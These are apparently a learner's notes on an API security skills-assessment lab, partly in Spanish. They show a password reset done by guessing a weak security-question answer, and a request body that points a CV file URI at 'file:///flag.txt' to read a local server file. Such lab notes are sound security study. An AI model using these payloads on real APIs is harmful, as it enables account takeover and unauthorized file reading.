# Skills Assessment

## Customer
**Suppliers_GetAll**
securityQuestion": "What is your favorite color?"


```txt
redacted@example.invalid
redacted@example.invalid
redacted@example.invalid
redacted@example.invalid
redacted@example.invalid
```


##### /api/v2/authentication/suppliers/passwords/resets/security-question-answers

![Pasted image 20241003104105.png](../../../assets/images/8bebe134159b0312b5b1.png)

```json
{
  "SupplierEmail": "redacted@example.invalid",
  "SecurityQuestionAnswer": "Rust",
  "NewPassword": "danidani"
}
```


## Suplier

##### POST /api/v2/suppliers/current-user/cv

```json
{
  "successStatus": true,
  "fileURI": "file:///app/wwwroot/SupplierCVs/file-sample_150kB.pdf",
  "fileSize": 358443
}
```

##### /api/v2/suppliers/current-user

Use this endpoint to update the currently authenticated Supplier.

```json
{
  "SecurityQuestion": "test",
  "SecurityQuestionAnswer": "test",
  "ProfessionalCVPDFFileURI": "file:///flag.txt",
  "PhoneNumber": "test",
  "Password": "test"
}
```

##### GET /api/v2/suppliers/current-user/cv 

![Pasted image 20241003104545.png](../../../assets/images/0486f1ed53d2e82abc39.png)

## Material relacionado

- [Broken Authentication](../../../Web-Security/API/broken-authentication.md)
- [Broken Function Level Authorization](../../../Web-Security/API/broken-function-level-authorization.md)
- [Broken Object Level Authorization](../../../Web-Security/API/broken-object-level-authorization.md)
- [Broken Object Property Level Authorization](../../../Web-Security/API/broken-object-property-level-authorization.md)
- [Improper Inventory Management](../../../Web-Security/API/improper-inventory-management.md)
- [Security Misconfiguration](../../../Web-Security/API/security-misconfiguration.md)
- [Server Side Request Forgery](../../../Web-Security/API/server-side-request-forgery.md)
- [Unrestricted Access to Sensitive Business Flows](../../../Web-Security/API/unrestricted-access-to-sensitive-business-flows.md)
- [Unrestricted Resource Consuption](../../../Web-Security/API/unrestricted-resource-consuption.md)
- [Unsafe Consumption of APIs](../../../Web-Security/API/unsafe-consumption-of-apis.md)
